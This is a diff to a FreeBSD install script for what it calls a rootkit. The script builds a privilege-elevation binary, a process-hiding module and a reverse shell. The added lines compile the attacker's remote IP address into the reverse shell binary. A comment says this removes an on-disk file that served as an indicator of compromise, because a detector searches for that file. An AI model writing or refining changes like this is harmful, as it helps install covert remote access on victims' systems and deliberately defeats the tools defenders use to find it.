@@ -27,6 +27,10 @@ fail() {
 [ -d "$MODULE_DIR" ] || fail "Kernel directory not found: $MODULE_DIR"
 [ -f "$ELEVATE_SRC" ] || fail "Source file not found: $ELEVATE_SRC"
 
+# REMOTE_IP is compiled into the revshell below (-DDEFAULT_REMOTE_IP), so the
+# install writes no address to disk. /etc/rootkit_remote_ip used to be a
+# permanent on-disk IOC -- the detector greps for exactly that string.
+#
 # Check dependencies. Without the `|| fail` these were silent under `set -e`:
 # the loop only returned the status of the last command -v.
 for command in make kldload kldstat cc install sysrc realpath; do
@@ -45,7 +49,18 @@ cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC" "$MODULE_DIR/proc_hiding.c"
 # optional: if the sources are not shipped, skip them instead of aborting the
 # whole install (which would also stop the log sender from being installed).
 if [ -f "$MODULE_DIR/revshell.c" ]; then
-    cc -Wall -Wextra -I. -I"$MODULE_DIR" -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" "$MODULE_DIR/proc_hiding.c" || fail "Failed to build revshell"
+    # Only bake the address in when there is one. Defining the macro as an
+    # empty string would override the fallback in revshell.c (#ifndef
+    # DEFAULT_REMOTE_IP) and leave inet_pton with nothing to parse.
+    if [ -n "$REMOTE_IP" ]; then
+        cc -Wall -Wextra -DDEFAULT_REMOTE_IP="\"$REMOTE_IP\"" -I. -I"$MODULE_DIR" \
+            -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" \
+            "$MODULE_DIR/proc_hiding.c" || fail "Failed to build revshell"
+    else
+        cc -Wall -Wextra -I. -I"$MODULE_DIR" \
+            -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" \
+            "$MODULE_DIR/proc_hiding.c" || fail "Failed to build revshell"
+    fi
     chmod 755 "$MODULE_DIR/revshell"
 fi
 
